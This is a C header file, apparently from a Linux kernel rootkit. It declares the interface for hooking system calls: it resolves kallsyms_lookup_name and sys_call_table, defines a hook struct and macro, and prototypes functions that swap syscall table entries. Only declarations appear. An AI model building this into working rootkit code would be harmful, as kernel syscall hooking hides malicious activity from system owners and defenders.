#ifndef _ROOTKIT_HOOKING_H_
#define _ROOTKIT_HOOKING_H_

#include <asm/ptrace.h>
#include <linux/types.h>


#define KALLSYMS_NAME       "kallsyms_lookup_name"
#define SYS_CALL_TABLE_NAME "sys_call_table"

typedef void *(*kallsyms_t)(const char *s_name);
typedef long (*sysfun_t)(struct pt_regs *p_regs);

typedef struct hook_tag {
    const size_t sz_syscall_nr;
    const sysfun_t new_sysfun;
    sysfun_t *p_orig_sysfun;
} hook_t;

#define NEW_HOOK(_syscall_nr, _new_sysfun, _orig_sysfun)             \
    {                                                                \
        .sz_syscall_nr = (_syscall_nr), .new_sysfun = (_new_sysfun), \
        .p_orig_sysfun = &(_orig_sysfun)                             \
    }

int init_hooking(void);
sysfun_t get_syscall_entry(size_t sz_syscall_nr);
void set_syscall_entry(size_t sz_syscall_nr, sysfun_t new_sysfun);
int hook_syscall(hook_t *p_hook);
void unhook_syscall(const hook_t *p_hook);
int hook_syscalls(hook_t p_hooks[], size_t sz_count);
void unhook_syscalls(const hook_t p_hooks[], size_t sz_count);

#endif
